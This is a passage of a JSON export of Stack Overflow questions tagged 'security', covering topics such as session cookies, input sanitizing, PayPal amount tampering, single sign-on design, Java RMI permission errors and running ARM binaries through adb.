doesn't have access to 'C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\Temporary ASP.NET Files'.</p>\n\n<p>How do I have a sub folder of an application which does not execute dotnet code?</p>\n"},{"tags":["security","cakephp","cakephp-1.3"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12382266,"title":"CakePHP 1.3 black hole when posting associated model form","body":"<p>I came across this problem, where my hidden fields causes a black hole, when an Associated model Form is Posted.\nThe \"is locked\" array, points out on to the hidden Contact Model fields (ei city and id), causing a mismatch in the Token.\nThis in general, is my Form:</p>\n\n<pre><code>&lt;?php echo $this-&gt;Form-&gt;create('Member');?&gt;\n    &lt;fieldset&gt;\n    &lt;?php\n        echo $this-&gt;Form-&gt;input($field_prefix.'family_id',array('type'=&gt;'hidden'));\n        echo $this-&gt;Form-&gt;input($field_prefix.'contact_id',array('type'=&gt;'hidden'));\n        echo $this-&gt;Form-&gt;input($field_prefix.'term_id',array('type'=&gt;'hidden','value'=&gt;$memberrole));\n\n//Associated Model\necho $this-&gt;Form-&gt;input('Contact.0.city',array('type'=&gt;'hidden'));\n\n        echo $this-&gt;Form-&gt;input('Contact.0.postcode');\n        echo $this-&gt;Form-&gt;input('Contact.0.phone');\n        echo $this-&gt;Form-&gt;input('Contact.0.cellphone');\n        echo $this-&gt;Form-&gt;input('Contact.0.email',array('value'=&gt;\"\"));\n        echo $this-&gt;Form-&gt;input('Contact.0.id',array('type'=&gt;'hidden'));        \n    ?&gt;\n    &lt;/fieldset&gt;\n&lt;?php echo $this-&gt;Form-&gt;end(__('Submit', true));?&gt;\n</code></pre>\n\n<p>Any Ideas? I really don't want to disable security.</p>\n"},{"tags":["windows","security","iis","iis7"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13187709,"title":"Block access to any directory of a certain name","body":"<p>Is it possible in IIS to block access to any directory in the public web folder, that has a certain name. For example <code>private_cms</code>?</p>\n\n<p>If possible, is there any performance penalty to this? Would it be better to store the files outside of the www folder?</p>\n"},{"tags":["php","security","redirect","data-structures","get"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":31,"score":-1,"question_id":13203839,"title":"unwanted URL switch and security concern. looking for a simpler or better solution","body":"<p>I couldn't do it any shorter :-/</p>\n\n<p>I'm having a problem with my php project concerning redirects and $_GET.</p>\n\n<p>I hope you will help me :)</p>\n\n<p>Lets say I have these 3 folders in the root of my Webserver.</p>\n\n<pre><code>/root\n   /themes\n         /page.php\n   /project1\n         /index.php\n         /content.php\n   /project2\n         /index.php\n         /content.php\n</code></pre>\n\n<p><code>/themes</code> contains a php file called <code>/page.php</code><br />\n<code>/page.php</code> contains a dynamic PHP/HTML structure or theme, which I can use for different content files.<br /></p>\n\n<p><code>/project1</code> and <code>/project2</code> contain mostly HTML content files which get included by <code>/page.php</code>.<br /></p>\n\n<p><code>/project1</code> and <code>/project2</code> are the root folders for 2 different domains, so each contains an <code>index.php</code>.</p>\n\n<p><b>Now the problem:</b><br />\nIn order to get the websites for each domain to work I have to redirect the user to <code>/themes/page.php</code>, because thats where the functionality is and then include the correct content files.<br />\nTo let <code>/page.php</code> know what content file out of <code>/project1</code> or <code>/project2</code> it has to load I use a redirect for <code>index.php</code> to fill <code>$_GET</code> ,like this :</p>\n\n<pre><code>header(\"Location: root-domain/themes/page.php?path=project1&amp;file=content1\");\n</code></pre>\n\n<p>That way page.php gets to know the path and filename of the requested file, by taking it from GET.</p>\n\n<p><b>BUT:</b><br />\nThat way the user gets to know each folder and each filename, even of some php files. I don't know if that's good?<br />\nAnd the URL changes from the requested URL into the URL of my webserver root.</p>\n\n<p>Does one know a better solution?</p>\n\n<p>Thanks! &lt;3</p>\n"},{"tags":["security","amazon-rds","data-security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13053526,"title":"Amazon RDS Security - Is there any alternative to Encryption at Rest?","body":"<p>When using a Cloud DB Provider like the Amazon RDS service, the service is responsible for various things like patching / updates / backup etc, does that mean that Amazon employees have access to the data within the DB itself? </p>\n\n<p>If so, is there any way of ensuring that the provider's employees do not have access - to potentially misuse the data?</p>\n\n<p>One way that I am aware of is by using Encryption at rest i.e. have my application encrypt sensitive data before saving to the DB and decrypt it on retrieval. However, this is not only an overhead in terms of performance but also requires changes to my application itself.</p>\n\n<p>I am guessing that most customers who contemplate using a cloud DB service would probably have this as their first concern but I am somehow unable to get any specific answer around this either from the Amazon help / RDS security notes. </p>\n\n<p><em>Note : While I understand that this is not really a programming question but i do feel that its not generic enough for programmers so I am posting it here.</em> </p>\n"},{"tags":["security","android-ndk","adb"],"answer_count":2,"favorite_count":0,"up_vote_count":12,"down_vote_count":0,"view_count":192,"score":12,"question_id":12523992,"title":"Run native ARM executable on Jelly Bean","body":"<p>I am looking for methods to run native ARM executable on Android 4.1 (Jelly Bean). For example, compiling the classical C program</p>\n\n<pre><code>// hello.c\n#include &lt;stdio.h&gt;\nint main() {\n    printf(\"Hello world\");\n}\n</code></pre>\n\n<p>to ARMv7a executable, say <code>hello</code> using the Android NDK and then run it in Android shell. I have tried method suggested on the web such as pushing the executable to <code>/data/local</code> by</p>\n\n<pre><code>adb push hello /data/local\n</code></pre>\n\n<p>change permission to allow it to be executed by</p>\n\n<pre><code>adb shell chmod 755 /data/local/hello\n</code></pre>\n\n<p>and then invoke them in the shell using</p>\n\n<pre><code>adb shell /data/local/hello\n</code></pre>\n\n<p>The last step fails with error:</p>\n\n<pre><code>/data/local/hello: not found\n</code></pre>\n\n<p>but evidently the file is there. I suspect the problem is that Jelly Bean's shell does not allow one to execute <em>alien</em> binaries anymore. Can anyone confirm this and give me a solution?</p>\n"},{"tags":["asp.net-mvc","security","query-string","guid"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13201844,"title":"table ids in querystrings","body":"<p>We have an MVC 3 application that uses nHibernate. There are various controller actions that expose the ids of objects contained in the database, e.g. /edit/1. These are just sequential numeric ids of the records in the database.</p>\n\n<p>Would it be better security wise to use GUID's instead, to prevent URL tampering?</p>\n"},{"tags":["security","session","login"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":41,"score":3,"question_id":13146298,"title":"Why should I use session id in cookie instead of storing login and (hashed) password in cookie?","body":"<p>(I was surprised that this question wasn't asked on Stack for now, but I've done some searching and couldn't find anything o.O)</p>\n\n<p>I am working on service-based webapp and I wonder what is the best way for handling user logins. So far I have:</p>\n\n<ol>\n<li>When user login in, they supply creditials. Password is salted and hashed locally, than it's transmit to server over POST (so sniffing users won't be able to retrieve original password ie. to check them on the other sites)</li>\n<li>Login and hashed password are stored in cookie with TTL of 15 minutes (revoked every single webaction)</li>\n<li>Passwod is server-side salted and hashed again, and than it's compared with password stored in database (so, passwords are double hashed with different salts, this is for someone who'll break into database - they still won't be able to recover login creditionals)</li>\n<li>User can do at most 3 login attempts per 5 minutes from single IP</li>\n<li>Users get information about last successful and unsuccessful login attempts alongside with date and IP</li>\n</ol>\n\n<p>Someone had noted that it's better to store unique session id instead of hashed password in cookie and I wonder why it is so important - if someone sniff packets, than it's no matter session id or not - they still can get packet from login with all data needed to pose as legitimate users and login themselves. So are there any other advantages of stored session-id approach over storing login and hashed-password in cookie appraoach?</p>\n"},{"tags":["security","plugins","jre","exploit","metasploit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13192432,"title":"Where can I download JRE 7u5 plugin for any browser?","body":"<p>I was looking for a good exploit to use as my final project for security class so I though for JRE 7u5 bug to exploit using Metasploit.</p>\n\n<p>Where I can download that version of plugin for FireFox/IE/Chrome, for whatever browser?</p>\n\n<p>I Googled for hours now and I can't find a link =?</p>\n"},{"tags":["objective-c","ios","security","hash","sha256"],"answer_count":2,"favorite_count":12,"up_vote_count":13,"down_vote_count":0,"view_count":4039,"score":13,"question_id":6228092,"title":"How can I compute a SHA-2 (ideally SHA 256 or SHA 512) hash in iOS?","body":"<p>The Security services API doesn't appear to allow me to compute a hash directly. There are plenty of public domain and liberally licensed versions available, but I'd rather use a system library implementation if possible.</p>\n\n<p>The data is accessible via NSData, or plain pointers.</p>\n\n<p>The cryptographic strength of the hash is important to me. SHA-256 is the minimum acceptable hash size.</p>\n"},{"tags":["php","security","sanitize"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":36,"score":-1,"question_id":13197651,"title":"Sanitizing global arrays in PHP","body":"<p>I'm trying to find the best way to sanitize requests in PHP. </p>\n\n<p>From what I've read I learned that GET variables should be sanitized only when they're being displayed, not at the beginning of the \"request flow\". Post variables (which don't come from the database) either.</p>\n\n<p>I can see several problems here:</p>\n\n<p>Of course I can create functions sanitizing these variables, and by calling something like <code>Class::post('name')</code>, or <code>Class::get('name')</code> everything will be safe. But what if a person who will use my code in the future will forget about it and use casual <code>$_POST['name'</code>] instead of my function? Can I provide, or should I provide a bit of security here?</p>\n"},{"tags":["security","google-chrome","ssl","selenium","phpunit"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13198004,"title":"PHPUnit/Selenium - How to stop Google Chrome from showing a SSL security error","body":"<p>I'm running my selenium tests on a server that doesn't have a valid security certificate.  So when I run the tests I have to click \"Proceed Anyway\" on the certificate error screen in order for my tests to start.  I'm trying to automate my tests, but can't because I have to manually click \"Proceed Anyway\" for each one of my tests.</p>\n\n<p>Is there any way to disable the SSL error when starting Chrome for my automated tests?</p>\n\n<p>Thanks,</p>\n\n<p>John</p>\n"},{"tags":["security","grails","ip","cloud"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13142733,"title":"Grails get Client IP whne deploying to Cloud?","body":"<p>I have a Grails App and I am looking to lock it down by ip so that only a number of IP ranges can access the application. I have used the Spring Security command within Config to achieve this:</p>\n\n<pre><code>grails.plugins.springsecurity.ipRestrictions\n</code></pre>\n\n<p>Then when running the App in the cloud (Jelastic) even though I am on one of the IP's I listed it doesnt let me access the areas I want. I then put some code in the app shown below to pull back the address of the Client and it shows the address of maybe the cloud proxy server instead of the Client using the App:</p>\n\n<pre><code>request.getRemoteAddr()\n</code></pre>\n\n<p>I think that it wont let me access the areas I want as its reading my IP as the IP of the cloud proxy, I have also tried running the commands below to see if any of them return my actual IP, however they were all null :S</p>\n\n<pre><code>request.getHeader(\"X-Forwarded-For\");  \n\nrequest.getHeader(\"Proxy-Client-IP\");  \n\nrequest.getHeader(\"WL-Proxy-Client-IP\") \n\nrequest.getHeader(\"HTTP_CLIENT_IP\")\n\nrequest.getHeader(\"HTTP_X_FORWARDED_FOR\")\n</code></pre>\n\n<p>I just need to know if there is some way of restricting this application down in the cloud by Client IP instead of it using the IP of the Cloud Proxy? Thanks in advance</p>\n"},{"tags":[".net","security","networking","distributed-computing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13198282,"title":"Safely executing .NET code on remote clients","body":"<p>I have a couple of students working on a volunteer computing project. Although is a school project for them, once finished and correctly tested we will begin the implantation in our faculty for real use. The idea is to create a platform for general purpose distributed computing in out faculty's internal network. But we are just starting. </p>\n\n<p>The first problem we need to solve is this: using an already implemented distributed system with automatic discovery, replication, and the other characteristics such a system needs, we want to take a user's code in .NET and run it in this distributed system. Since is a volunteer system, we need to respect every node's settings for maximum available memory and CPU use, and run in a safe environment where the user's code has no access to the client's file system, can't raise new processes, etc.</p>\n\n<p>So, the general question is: what is the best way to proceed, regarding both the sharing of the code and the security. </p>\n\n<p>We have discussed a few ideas, that I present now for your evaluation and comments. Any suggestion is greatly appreciated. </p>\n\n<ul>\n<li>Somehow serialize a .NET delegate together with its closure.</li>\n<li>Force the user to implement some interface and then upload his assembly and dependencies, find an implementation of this interface, instantiate it and run it. Maybe add some attributes.</li>\n<li>Expose the distributed system inner workings and let the user deal with the creation and synchronization of his distributed tasks.</li>\n</ul>\n\n<p>I would prefer the most transparent solution, as close to the Task Parallel Library interface as possible.</p>\n\n<p>Thanks in advance. </p>\n"},{"tags":["security","encryption","paypal","e-commerce"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":229,"score":3,"question_id":3784015,"title":"Is this Paypal setup secure?","body":"<p>I just wanted to run this by other heads to make sure I wasn't missing something obvious. I am using Payflow Link, which handles all the credit card nastiness of ecommerce transactions. However, you pass the total amount of the transaction to PayPal over POST variables - which seems like a potential security hole:</p>\n\n<ol>\n<li>A malicious user could load up his cart and proceed to checkout</li>\n<li>By reading the hidden input fields, he could spoof the POST to PayPal with a total amount of 1 cent. </li>\n<li>Paypal would executes the transaction, calls my order logging script, which would log the transaction and mark his items for shipment.</li>\n</ol>\n\n<p>I could check total amount against his cart by accessing the database, pulling his cart items, and re-totaling their prices plus shipping and tax. But that is a lot of heavy lifting just to check for tampering (multiple DB queries, plus 2 web service calls per item to get shipping and tax).</p>\n\n<p>My idea:</p>\n\n<ol>\n<li>PayPal is sent the normal POST variables for the amount</li>\n<li>But then, in the user defined variables (which get forwarded to my logging script), store a sha1 hash of the total amount, plus some private key</li>\n<li>On the other side, the logging script rehashes the dollar amount, plus the same private key, and compares to the hash sent through.</li>\n<li>Differences between the sent hash and computed hash would indicate tampering, and the order would be red-flagged for human review.</li>\n</ol>\n\n<p>Does this make sense? Am I missing something?</p>\n\n<p><strong>edit (for clarification):</strong></p>\n\n<p>Apparently I wasn't making my point clear, based on the first several responses. I realize this isn't an ideal setup. I know other companies offer similar or possibly even better services. I know I have to check the variables and I can't simply trust them. Please, if you are going to reply, all I am looking for in an answer is this:</p>\n\n<h2>Can anyone demonstrate a single vulnerability with my proposal that would allow a malicious user to alter the PayPal variables and go undetected?</h2>\n\n<p>It is a very straightforward question. That is all I am looking for. To anyone who can answer that, thank you in advance for you time and help!</p>\n"},{"tags":["security","encryption","cryptography"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":32,"score":0,"question_id":13169135,"title":"CPA Secure Chosen plaintext scheme","body":"<p>The example for IND-CPA secure schemes given is generally:</p>\n\n<p>for a random r, </p>\n\n<blockquote>\n  <p>Enc_k(m) =(r|| E_k(r) XOR m) where E is a PRF</p>\n</blockquote>\n\n<p>But does the role of r and k really matter--i.e. isn't this equally secure? </p>\n\n<blockquote>\n  <p>Enc_k(m) =(r|| E_r(k) XOR m) ? </p>\n</blockquote>\n"},{"tags":["javascript","html","security","browser","text-editor"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13197212,"title":"Cut,Copy, paste not working in tiny mce editor","body":"<p>I have using tiny MCE editor to input the contents.If i want to cut, copy or paste any word it shows some error message like<br>\n   \"Copy/Cut/Paste is not available in Mozilla and Firefox.Do you want more information about this issue?\"</p>\n\n<p>or  \"Currently not supported by your browser, use keyboard shortcuts instead.\"..</p>\n\n<p>How can i fix this problem. any one help me.</p>\n\n<p>Thanks in advance..</p>\n"},{"tags":["c#",".net","security","zip","fips"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":298,"score":2,"question_id":8447367,"title":"FIPS 140-2 compliant .NET Zip Solution?","body":"<p>Other than Xceed, is there a Zip library for .NET that uses encryption algorithms that can be used in a FIPS 140-2 enabled environment?</p>\n\n<p>FYI I have read on DotNetZip but it uses WinZipAes, based on Rijndael which is not FIPS 140-2 compliant. Also I have checked Rebex but only their SFTP component is FIPS compliant.</p>\n\n<p>Edit: For the Zip solution I am looking for, the only FIPS requirement I have is that it uses compatible algorithms (such as CryptoServiceProvider or Cng classes in .NET).</p>\n"},{"tags":["php","security","authentication","single-sign-on"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":95,"score":3,"question_id":12813918,"title":"Single signon web-based authentication system","body":"<p>I'm hoping for feedback on an authentication system I have designed.</p>\n\n<p>The requirements are to create a closed, single sign on web environment, where by once one of our employees visit one of our web applications, they are asked to sign in with their credentials backed by our LDAP. Once signed in, they retain this login for a set time period, or the browser session, and across all our web applications. Much how Google's web properties work with a google account, but for our internal systems.</p>\n\n<p>The users themselves operate from windows, mac or linux, and some from just tablets, so this authentication environment needs to exist solely online, kerberos with mod_auth_kerb etc aren't going to cut it.</p>\n\n<p>All our current web applications use PHP.</p>\n\n<p>The system I have so far works like below.</p>\n\n<p>There exists one central authentication system, which I will call the Authentication Handler, or \"handler\" for short, and one or more authentication \"client\" web apps, which I will call Authentication Requestor, or \"requestor\" for short. I will call the user and their browser just \"user\".</p>\n\n<p>Also, for it to work, the requestor needs to be preconfigured at the handler with a unique <code>requestor_id</code> and return URL for that ID.\nA private key for handler is generated and a public key given to all requestors before hand too.</p>\n\n<h2>user visits requestor</h2>\n\n<ol>\n<li>user enters URL for requestor.</li>\n<li>no session exists for this user on requestor, so requestor creates a new <code>SESSION_ID</code> in PHP (with the built in session handler and <code>session_start</code>).</li>\n<li>the session has no authentication, so requestor will then generate a URL to the configured handler consisting of two parts, an <code>authrequest</code> token and an <code>envelope</code>.\n<ol>\n<li>requestor first regenerate a new session_id (<code>session_regenerate_id</code> in PHP) for this auth request for the client. </li>\n<li>requestor then generates a random password, in this case using PHP's <code>openssl_random_pseudo_bytes</code> and stores this in the session data</li>\n<li>requestor then encrypts the <code>SESSION_ID</code> using <code>AES256</code> with the random password for the <code>authrequest</code> in PHP using <code>openssl_encrypt</code>.</li>\n<li>requestor then generates envelope data by concatenating it's unique <code>requestor_id</code>, a ':', and the base64-encoded random password.</li>\n<li>requestor's envelope data is then encrypted using the pre-shared public key for the handler using <code>openssl_public_encrypt</code> in PHP.</li>\n</ol></li>\n<li>requestor then sends a <code>location:</code> header to user that contains the encrypted <code>envelope</code> and the <code>authrequest</code> as URL parameters to handler.</li>\n<li>handler will decrypt the envelope using it's private key, and separate the clientID and password.</li>\n<li>handler will check the <code>requestor_id</code> to see if we have this configured, if not, will inform the user that the requestor was not recognised.</li>\n<li>handler will authenticate the user (in this case, via asking for username and password and checking against LDAP and/or via a preauthenticated session)</li>\n<li>handler will then generate a return <code>authtoken</code> to requestor\n<ol>\n<li>handler will decrypt the <code>SESSION_ID</code> from <code>authrequest</code> using the decrypted and decoded password from the envelope</li>\n<li>handler will encrypt a new string containing <code>SESSION_ID</code> and an ID of the logged in credentials (username, GUID, etc) with the decrypted and decoded password from the envelope</li>\n</ol></li>\n<li>handler then sends a <code>location:</code> header to user that contains the <code>authtoken</code> as URL parameter to a preconfigured URL for this <code>requestor_id</code>.</li>\n<li>requestor receives the request, and will decrypt the token using the password in the users session.</li>\n<li>requestor will confirm the <code>SESSION_ID</code> matches the users current session, else it will restart authentication.</li>\n<li>requestor can then use the returned crednetialID to identify a local user as authenticated.</li>\n</ol>\n\n<p>This process can be repeated across different systems to give a single signon behaviour.</p>\n\n<p>So, questions:</p>\n\n<ol>\n<li>Does anyone know of a pre-existing, standardised authentication system that meets the requirements and preforms similarly to above?</li>\n<li>If not, and given that I'm no security expert, is there anything above that would could be broken? i.e. what is/are the weak point(s) of this method?</li>\n</ol>\n"},{"tags":["java","security","rmi","unmarshalling","accesscontrolexception"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":4027,"score":1,"question_id":1666028,"title":"Java RMI (Server: TCP Connection Idle/Client: Unmarshalexception (EOFException))","body":"<p>I'm trying to implement Sun Tutorials RMI application that calculates Pi. I'm having some serious problems and I cant find the solution eventhough I've been searching the entire web and several javaskilled people.\nI'm hoping you can put an end to my frustrations.</p>\n\n<p>The crazy thing is that I can run the application from the cmd on my desktop computer. Trying the exact same thing with the exact same code in the exact same directories on my laptop produces the following errors. The problem occures when I try to connect the client to the server.</p>\n\n<p>I don't believe that the error is due to my policyfile as I can run it on the desktop. It must be elsewhere. Have anyone tried the same and can you give me a hint as to where my problem is, please?</p>\n\n<p><hr /></p>\n\n<p>POLICYFILE SERVER:\ngrant\n{\n    permission java.security.AllPermissions;\n    permission java.net.SocketPermission\"*\", \"connect, resolve\";\n};</p>\n\n<p>POLICYFILE CLIENT:\ngrant\n{\n    permission java.security.AllPermissions;\n    permission java.net.SocketPermission\"*\", \"connect, resolve\";</p>\n\n<p>};\n<hr /></p>\n\n<p>SERVERSIDE ERRORS:\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.</p>\n\n<p>C:\\Documents and Settings\\STUDENT>cd\\</p>\n\n<p>C:>start rmiregistry</p>\n\n<p>C:>java -cp c:\\java;c:\\java\\compute.jar -Djava.rmi.server.codebase=file:/c:/jav\na/compute.jar -Djava.rmi.server.hostname=localhost -Djava.security.policy=c:/jav\na/servertest.policy engine.ComputeEngine\nComputeEngine bound</p>\n\n<p>Exception in thread \"RMI TCP Connection(idle)\" java.security.AccessControlExcept\nion: access denied (java.net.SocketPermission 127.0.0.1:1440 accept,resolve)\n        at java.security.AccessControlContext.checkPermission(Unknown Source)\n        at java.security.AccessController.checkPermission(Unknown Source)\n        at java.lang.SecurityManager.checkPermission(Unknown Source)\n        at java.lang.SecurityManager.checkAccept(Unknown Source)\n        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.checkAcceptPermi\nssion(Unknown Source)\n        at sun.rmi.transport.tcp.TCPTransport.checkAcceptPermission(Unknown Sour\nce)\n        at sun.rmi.transport.Transport$1.run(Unknown Source)\n        at java.security.AccessController.doPrivileged(Native Method)\n        at sun.rmi.transport.Transport.serviceCall(Unknown Source)\n        at sun.rmi.transport.tcp.TCPTransport.handleMessages(Unknown Source)\n        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(Unknown Sou\nrce)\n        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(Unknown Sour\nce)\n        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source\n)\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)\n        at java.lang.Thread.run(Unknown Source)</p>\n\n<p><hr /></p>\n\n<p>CLIENTSIDE ERRORS:\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.</p>\n\n<p>C:\\Documents and Settings\\STUDENT>cd\\</p>\n\n<p>C:>java -cp c:\\java;c:\\java\\compute.jar -Djava.rmi.server.codebase=file:\\C:\\jav\na\\files\\ -Djava.security.policy=c:/java/clienttest.policy client.ComputePi local\nhost 45</p>\n\n<p>ComputePi exception:\njava.rmi.UnmarshalException: Error unmarshaling return header; nested exception\nis:\n        java.io.EOFException\n        at sun.rmi.transport.StreamRemoteCall.executeCall(Unknown Source)\n        at sun.rmi.server.UnicastRef.invoke(Unknown Source)\n        at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(Unkn\nown Source)\n        at java.rmi.server.RemoteObjectInvocationHandler.invoke(Unknown Source)\n        at $Proxy0.executeTask(Unknown Source)\n        at client.ComputePi.main(ComputePi.java:18)\nCaused by: java.io.EOFException\n        at java.io.DataInputStream.readByte(Unknown Source)\n        ... 6 more</p>\n\n<p>C:></p>\n\n<p><hr /></p>\n\n<p>Thanks in advance\nPerry</p>\n"},{"tags":["security","hash","cryptography"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":41,"score":-3,"question_id":13189235,"title":"What is the maximum input length of MD5 function?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3394503/maximum-length-for-md5-input-output\">Maximum length for MD5 input/output</a>  </p>\n</blockquote>\n\n\n\n<p>I know that MD5 function produces a maximum length of 32 bytes, but what about its maximum input?</p>\n"},{"tags":["git","security","audit","repo"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13193970,"title":"Git commit auditing","body":"<p>I have a git server running over ssh and each user has a unix account on the system.</p>\n\n<p>Given that two users have access to a repo, how can I be sure which user performed which commit, since the commit user name and email is submitted and controlled by the git client.</p>\n\n<p>I am concerned that a user might try to impersonate another, even if they have the same authorization rights.</p>\n"},{"tags":["html","security","iis","post","get"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13193691,"title":"Server does allow GET method but doesn't allow POST","body":"<p>I have a simple static html site which uses jquery's POST-methods and some forms which also uses form method=\"post\"...</p>\n\n<p>i now get the following error: NetworkError: 405 Method Not Allowed</p>\n\n<p>when i view the response header with firebug i see that the server (IIS btw.) does allow the following:\nGET, HEAD, OPTIONS, TRACE</p>\n\n<p>My hoster says that he can't allow POST methods on static html files because of security reasons... </p>\n\n<p>Can anyone tell me the security differences between POST and GET? I don't understand why GET is allowed and POST not. any help to argue that he can allow it would be very appreciated :-)</p>\n\n<p>Thanks in advance\nThomas </p>\n"},{"tags":["c#","wcf","security","iis","http-basic-authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13176143,"title":"WCF in IIS, http basic authentication - Windows User \"security\" implications","body":"<p>I created a WCF Service, using http Basic Authentication and SSL. (Temporary certificate in IIS atm)</p>\n\n<p>Here is the relevant configuration.</p>\n\n<pre><code>&lt;services&gt;\n  &lt;service name=\"MyNamespace.MyService\"&gt;\n    &lt;endpoint address=\"\" binding=\"basicHttpBinding\" bindingConfiguration=\"basicHttps\"\n      name=\"MyEndPoint\" contract=\"MyNamespace.IMyService\" /&gt;\n  &lt;/service&gt;\n&lt;/services&gt;\n&lt;behaviors&gt;\n  &lt;serviceBehaviors&gt;\n    &lt;behavior name=\"\"&gt;\n      &lt;!-- These will be false when deployed --&gt;\n      &lt;serviceMetadata httpsGetEnabled=\"true\" /&gt;\n      &lt;serviceDebug includeExceptionDetailInFaults=\"true\" /&gt;\n    &lt;/behavior&gt;\n    &lt;!-- This doesn't do anything in IIS --&gt;\n    &lt;behavior name=\"CustomUsernameValidatorBehavior\"&gt;\n      &lt;serviceCredentials&gt;\n        &lt;userNameAuthentication userNamePasswordValidationMode=\"Custom\"\n          customUserNamePasswordValidatorType=\"MyNamespace.CustomUserNameValidator\" /&gt;\n      &lt;/serviceCredentials&gt;\n    &lt;/behavior&gt;\n  &lt;/serviceBehaviors&gt;\n&lt;/behaviors&gt;\n&lt;bindings&gt;\n  &lt;basicHttpBinding&gt;\n    &lt;binding name=\"basicHttps\"&gt;\n      &lt;security mode=\"Transport\"&gt;\n        &lt;transport clientCredentialType=\"Basic\" /&gt;\n      &lt;/security&gt;\n    &lt;/binding&gt;\n  &lt;/basicHttpBinding&gt;\n&lt;/bindings&gt;\n</code></pre>\n\n<p>Due to the fact I am hosting in IIS, I can't use my customUsernameValidator, and IIS Basic authentication tries the username and password against Windows. </p>\n\n<p>I created a new user, disabled logon locally, and put it in a new group (without rights). The <strong>only</strong> purpose of the user is to ensure they are allowed to access the service, nothing else. The service will be online, not internal e.g. in an Intranet etc.</p>\n\n<p>My question boils down to this, is there security risks/implications due to the fact I am using a real windows user? What can be done to secure this service/IIS if so?</p>\n\n<p>Should something be done to prevent 'phishing' of information, could they for example try different usernames and passwords to find credentials?</p>\n\n<p><em>Btw this is a working binding (minus some other endpoints etc.) for WCF using Http Basic Authentication in IIS and SSL. It requires IIS has Basic Authentication installed, as well as a Windows User to authenticate against. I would prefer not to authenticate against a Windows user.</em></p>\n"},{"tags":["security","pdf"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":357,"score":2,"question_id":1074932,"title":"PDF Security","body":"<p>I have a question about PDF security preferences. Can I change an editable pdf to readable pdf programmatically?</p>\n"},{"tags":["flash","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13192479,"title":"What is the right way to change cookies/custom data stored by Flash?","body":"<p>Where Shockwave Flash data stored and how to change specific data stored by Flash player while using browser?</p>\n"},{"tags":["security","ssl","iis7","x509","certificates"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":13192472,"title":"IIS 7 X509 Certificate Issue","body":"<p>I am building a site that needs to call a 3rd party web service over https. The service requires an X509 certificate for authentication.</p>\n\n<p>I can successfully call the service and get a response back using a console application, or a web application running in visual studio web server, this suggests to me that the code, and certificate provided by the 3rd party are all ok.</p>\n\n<p>As soon as I deploy the site in IIS, it cannot connect to the service, I am getting \"The request was aborted: Could not create SSL/TLS secure channel\" error. I spent a couple of hours trying to figure this out, assuming it was permissions related as IIS app pool running under network service etc. </p>\n\n<p>The certificate is installed in the local machine store, not current user, and I have granted network service (also added everyone is desperation!) using the winhttpcertcfg tool and manually in MMC > Manage Private Keys, so I am confident that the network service account has access to the certificate. </p>\n\n<p>I also used the FindPrivateKey tool and checked the physical windows file and permissions look ok! I tried using identity impersonate in the config, using my windows account and that doesn't make a difference.</p>\n\n<p>I am pulling my hair out with this one, can anyone give me any suggestions on what to try next?</p>\n\n<p>Cheers</p>\n"},{"tags":["java","security","file-io","file-permissions","accesscontrolexception"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2777,"score":3,"question_id":10454037,"title":"java.security.AccessControlException: Access denied (java.io.FilePermission","body":"<pre><code>final File parentDir = new File(\"S:\\\\PDSPopulatingProgram\");\nparentDir.mkdir();\nfinal String hash = \"popupateData\";\nfinal String fileName = hash + \".txt\";\nfinal File file = new File(parentDir, fileName);\nfile.createNewFile(); // Creates file PDSPopulatingProgram/popupateData.txt\n</code></pre>\n\n<p>I am trying to create a file in a folder but I am getting exception as 